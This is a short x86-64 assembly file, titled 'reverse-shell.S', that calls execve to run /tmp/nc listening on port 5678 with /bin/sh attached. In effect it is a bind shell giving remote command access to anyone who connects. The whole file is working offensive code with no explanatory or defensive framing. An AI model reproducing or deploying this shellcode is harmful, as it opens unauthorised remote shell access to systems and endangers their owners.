; reverse-shell.S:
global _start

  section .text

  _start:
	  mov rdi, filename
	  mov rsi, argv
	  xor rdx, rdx
	  mov rax, 59
	  syscall

	  mov rax, 60
	  xor rdi, rdi
	  syscall

  section .rodata
  filename: db "/tmp/nc", 0
  arg1: db "-lnp", 0
  arg2: db "5678", 0
  arg3: db "-tte", 0
  arg4: db "/bin/sh", 0
  argv: dq filename, arg1, arg2, arg3, arg4, 0
